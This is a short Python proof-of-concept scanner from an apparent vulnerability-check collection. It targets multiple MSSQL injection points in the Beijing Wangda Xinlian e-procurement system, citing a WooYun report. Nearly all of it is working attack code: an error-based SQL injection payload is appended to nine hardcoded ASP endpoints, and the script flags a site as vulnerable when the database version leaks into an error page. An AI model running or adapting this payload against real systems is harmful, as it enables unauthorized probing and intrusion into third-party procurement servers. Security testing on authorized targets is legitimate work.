#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 北京网达信联电子采购系统多处注入
referer: http://www.wooyun.org/bugs/wooyun-2010-0122276
author: Lucifer
description: 多处mssql注入。
'''
import sys
import requests
import warnings
def run(url):
        result = ['北京网达信联电子采购系统多处注入','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "%27AnD%20ChAr(65)%2BChAr(71)%2BChAr(81)%2B@@version>0--"
        urls = ["/Rat/ebid/viewInvite3.asp?InviteId=0000002852",
                "/Rat/ebid/viewInvite4.asp?InviteId=0000002852",
                "/Rat/ebid/viewInvite5.asp?InviteId=0000002852",
                "/Rat/ebid/viewInvite6.asp?InviteId=0000002852",
                "/Rat/ebid/viewInvite2.asp?InviteId=0000002852",
                "/Rat/ebid/viewInvite1.asp?InviteId=0000002852",
                "/Rat/EBid/ViewClarify1.asp?InviteId=11",
                "/Rat/EBid/ViewClarify.asp?InviteId=11",
                "/Rat/EBid/AuditForm/AuditForm_ExpertForm.asp?InviteId=11"]
        try:
            noexist = True
            for turl in urls:
                vulnurl = url + turl + payload
                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                if req.status_code ==500 and r"AGQMicrosoft" in req.text:
                    result[2]=  '存在'
                    result[1] = vulnurl
                    noexist = False
            if noexist:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    